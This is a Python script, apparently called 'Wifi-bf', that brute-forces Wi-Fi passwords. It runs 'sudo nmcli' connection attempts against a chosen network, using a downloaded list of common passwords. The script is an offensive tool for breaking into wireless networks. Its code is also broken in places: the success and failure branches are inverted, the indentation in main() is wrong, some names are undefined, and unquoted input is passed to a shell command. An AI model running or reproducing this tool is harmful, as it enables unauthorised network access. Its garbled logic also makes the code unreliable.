
import os
import time
import sys
import bcolors
def display_targets(networks, security_type):
    print("Select a target: \n")

    rows, columns = os.popen('stty size', 'r').read().split()
    for i in range(len(networks)):
        width = len(str(str(i + 1) + ". " + networks[i] + security_type[i])) + 2
        spacer = " "

        if (int(columns) >= 100):
            calc = int((int(columns) - int(width)) * 0.75)
        else:
            calc = int(columns) - int(width)

        for index in range(calc):
            spacer += "."
            if index == (calc - 1):
                spacer += " "

        print(str(i + 1) + ". " + networks[i] + spacer + security_type[i])
def prompt_for_target_choice(max):
    while True:
        try:
            selected = int(input("\nEnter number of target: "))
            if(selected >= 1and selected <= max):
                return selected - 1
        except Exception as e:
            ignore = e
        print("Invalid choice: Please pick a number between 1 and " + str(max))


def brute_force(selected_network, passwords, args):
    for password in passwords:
        # necessary due to NetworkManager restart after unsuccessful attempt at login
        password = password.strip()
        # when when obtain password from url we need the decode utf-8 however we doesnt when reading from file
        if isinstance(password, str):
            decoded_line = password
        else:
            decoded_line = password.decode("utf-8")

        if args.verbose is True:
            print(bcolors.HEADER + "** TESTING **: with password '" +
                decoded_line + "'" + bcolors.ENDC)

        if (len(decoded_line) >= 8):
            time.sleep(3)

        creds = os.popen("sudo nmcli dev wifi connect " +
                 selected_network + " password " + decoded_line).read()

        # print(creds)

        if ("Error:" in creds.strip()):
            if args.verbose is True:
                print(bcolors.FAIL + "** TESTING **: password '" +
                    decoded_line + "' failed." + bcolors.ENDC)
            else:
                sys.exit(bcolors.OKGREEN + "** KEY FOUND! **: password '" +
                    decoded_line + "' succeeded." + bcolors.ENDC)
        else:
            if args.verbose is True:
                print(bcolors.OKCYAN + "** TESTING **: password '" +
                    decoded_line + "' too short, passing." + bcolors.ENDC)

    print(bcolors.FAIL + "** RESULTS **: All passwords failed :(" + bcolors.ENDC)





def main():
    require_root()
    args = argument_parser()

    # The user chose to supplied their own url
    if args.url is not None:
        passwords = fetch_password_from_url(args.url)
    # user elect to read passwords form a file
    elif args.file is not None:
        file = open(args.file, "r")
        passwords = file.readlines()
        if not passwords:
            print("Password file cannot be empty!")
            exit(0)
        file.close()
    else:
        # fallback to the default list as the user didnt supplied a password list
        default_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
        passwords = fetch_password_from_url(default_url)
        func_call = start(1)
        networks = func_call[0]
        security_type = func_call[1]

    if not networks:
        print("No networks found!")
        sys.exit(-1)

        display_targets(networks, security_type)
        max = len(networks)
        pick = prompt_for_target_choice(max)
        target = networks[pick]

print(
    "\nWifi-bf is running. If you would like to see passwords being tested in realtime, enable the [--verbose] flag at start.")

brute_force(target, passwords, args)





